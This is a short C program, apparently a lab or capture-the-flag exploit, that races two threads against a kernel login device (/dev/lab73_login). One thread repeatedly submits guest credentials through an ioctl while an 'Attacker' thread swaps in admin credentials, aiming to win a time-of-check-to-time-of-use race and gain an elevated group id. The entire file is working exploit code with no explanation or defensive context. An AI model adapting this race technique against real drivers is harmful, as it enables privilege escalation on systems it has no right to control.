//gcc -o 2.bin 2.c -lpthread

#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <unistd.h> // for chdir
#include <stdlib.h> // for system

#define DEVFILE "/dev/lab73_login"

#define CMD_LOGIN       100

#define LAB73WIN_ID	    1032

#define USERID_GUEST	9999
#define PASSWD_GUEST	123456
#define USERID_ADMIN	1337
#define PASSWD_ADMIN	0000



struct login_creds {
	long int userid;
	long int passwd;
};

struct login_creds login;

void *Attacker(void *arg) {
	
    sleep(5);
	login.userid = USERID_ADMIN;
    login.passwd = PASSWD_ADMIN;
    
    pthread_exit(NULL);
}


void *UserLogin(void *arg) {
	    
	printf("UL: open\n");
	int fd = open(DEVFILE, O_RDWR);
	if (fd < 0) {
		perror("Failed to open the device");
		pthread_exit(NULL);
	}

    login.passwd = PASSWD_GUEST;
    login.userid = USERID_GUEST;	       
	
    while (1) {
		ioctl(fd, CMD_LOGIN, &login);
		printf("UL: ioctl [%d:%d]\n", geteuid(), getegid());
		usleep(500);
        if(getegid()==1032){break;}
    }

	printf("UL: close and exit\n");
    close(fd);
    pthread_exit(NULL);
}


int main() {
    pthread_t tAttacker, tUserLogin;

    // Launch threads to create a race condition
    pthread_create(&tAttacker, NULL, Attacker, NULL);
    pthread_create(&tUserLogin, NULL, UserLogin, NULL);


    pthread_join(tAttacker, NULL);
    pthread_join(tUserLogin, NULL);


    printf("Operation complete.\n");
    return 0;
}
